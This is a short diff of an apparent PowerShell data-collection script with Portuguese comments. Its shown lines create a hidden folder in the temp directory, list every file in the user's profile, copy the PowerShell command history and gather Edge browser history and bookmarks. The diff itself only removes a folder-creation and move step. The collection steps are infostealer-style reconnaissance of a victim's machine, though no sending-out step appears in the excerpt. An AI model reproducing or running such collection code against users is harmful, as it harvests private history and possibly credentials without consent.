@@ -68,12 +68,6 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 # Reconhecimento de todos os diretórios do utilizador
 tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 
-#Criar Pasta e mover o ficheiro para lá
-New-Item -ItemType Directory -Path "$env:TEMP\$FolderName\tree
-
-#Move para o local correto
-Move-Item -Path "$env:TMP\$FolderName\tree.txt" -Destination "$env:TEMP\$FolderName\tree\tree.txt"
-
 # Histórico da PowerShell
 Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
 
@@ -511,7 +505,6 @@ function Get-BrowserData {
 #Criar pasta "Dados-do-Browser"
 New-Item -ItemType Directory -Path "$env:TEMP\$FolderName\Dados-do-Browser"
 
-#Cria os ficheiros com os dados correspondidos
 Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
 
 Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
